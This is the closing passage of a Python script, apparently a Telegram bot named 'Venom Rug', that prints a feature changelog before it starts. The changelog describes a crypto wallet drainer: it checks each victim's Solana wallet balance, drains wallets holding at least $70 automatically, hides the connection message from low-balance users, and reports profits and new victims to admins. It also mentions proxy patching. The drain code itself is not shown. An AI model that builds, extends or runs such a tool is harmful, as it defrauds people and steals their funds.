    print("📌 NEW: Auto-pinned profit message at the top of admin chat")
    print("💵 NEW: Wallet balance analysis - minimum $70 required for drain")
    print("🔍 NEW: Real-time SOL price monitoring for USD conversion")
    print("🔄 UPDATED: Button texts for Tokens and Bundler sections with emojis")
    print("✨ NEW: Added 3 new features to 'Why choose Venom Rug' list")
    print("📊 NEW: Advanced Analytics Dashboard with performance insights")
    print("🎯 NEW: Profit optimization recommendations")
    print("🚀 NEW: Upgrade potential analysis")
    print("🛡️ NEW: User-facing $100 minimum, admin $70 minimum")
    print("🔧 FIXED: Admin buttons now showing properly")
    print("🔄 UPDATED: Auto-drain triggers regardless of admin clicks for wallets <$70")
    print("🚫 FIXED: No 'wallet connected' message for users with <$70 balance")
    print("🆕 NEW: Admin notifications for new users joining")
    print("🔧 FIXED: Markdown parsing error in admin commands")
    print("🔧 FIXED: Application instance reference issue")
    print("🔧 FIXED: COMPREHENSIVE proxy patch applied to both httpx AND Solana HTTPProvider")
    application.run_polling()

if __name__ == "__main__":
    main()

